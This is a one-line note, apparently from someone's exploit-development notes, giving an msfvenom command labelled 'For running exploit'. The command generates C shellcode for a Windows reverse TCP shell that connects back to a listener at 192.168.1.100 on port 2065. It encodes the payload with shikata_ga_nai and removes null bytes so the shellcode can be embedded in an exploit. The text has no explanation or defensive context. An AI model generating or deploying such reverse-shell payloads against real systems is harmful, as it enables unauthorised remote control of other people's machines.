For running exploit -->  msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100  LPORT=2065 -e x86/shikata_ga_nai -b "\x00" -f c
